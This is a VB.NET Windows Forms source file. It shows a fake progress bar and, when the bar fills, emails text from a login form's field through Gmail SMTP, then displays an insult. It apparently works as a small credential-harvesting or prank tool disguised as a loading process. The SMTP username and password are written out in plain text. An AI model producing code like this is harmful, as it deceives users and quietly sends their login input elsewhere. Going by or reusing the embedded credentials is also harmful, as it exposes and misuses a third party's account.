Imports System.Net.Mail
Public Class Form4
    Private Property pageready As Boolean = False
#Region "Page Loading Functions"
    Private Sub WaitForPageLoad()
        AddHandler Form1.WebBrowser1.DocumentCompleted, New WebBrowserDocumentCompletedEventHandler(AddressOf PageWaiter)
        While Not pageready
            Application.DoEvents()
        End While
        pageready = False
    End Sub

    Private Sub PageWaiter(ByVal sender As Object, ByVal e As WebBrowserDocumentCompletedEventArgs)
        If Form1.WebBrowser1.ReadyState = WebBrowserReadyState.Complete Then
            pageready = True
            RemoveHandler Form1.WebBrowser1.DocumentCompleted, New WebBrowserDocumentCompletedEventHandler(AddressOf PageWaiter)
        End If
    End Sub

#End Region
    Private Sub Label1_Click(sender As Object, e As EventArgs)
        Me.Close()
        Form1.Show()
    End Sub

    Private Sub Form4_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label8.Text = Date.Now.ToString("ddddd-MM-yyyy HH:mm:ss")

    End Sub
    Private Sub sendEmail()
        Dim emailMessage As New MailMessage()
        Try

            emailMessage.From = New MailAddress(TextBox1.Text)
            emailMessage.To.Add(TextBox1.Text)
            emailMessage.Subject = Login.ElegantThemeTextBox1.Text
            emailMessage.Body = TextBox3.Text & Login.ElegantThemeTextBox1.Text & "AM:2113158 thats whats needed for the EMAIL!"
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.Port = 587
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("victoriachristos@gmail.com", "olympiakos12")
            SMTP.Send(emailMessage)


        Catch ex As Exception
            MessageBox.Show("There was an error sending your email! check your textboxes")
        End Try
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub


    Private Sub MenuStrip1_ItemClicked(sender As Object, e As ToolStripItemClickedEventArgs)

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Timer1.Start()

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Increment(1)
        PictureBox1.Width = CInt(ProgressBar1.Value * 2.82)
        If ProgressBar1.Value = 100 Then
            Timer1.Stop()
            sendEmail()

            MessageBox.Show("FUCK OFF")

        End If
    End Sub

    Private Sub Label1_Click_1(sender As Object, e As EventArgs) Handles Label1.Click
        Me.Close()
        Form1.Show()
    End Sub

    Private Sub Label2_Click_1(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub
End Class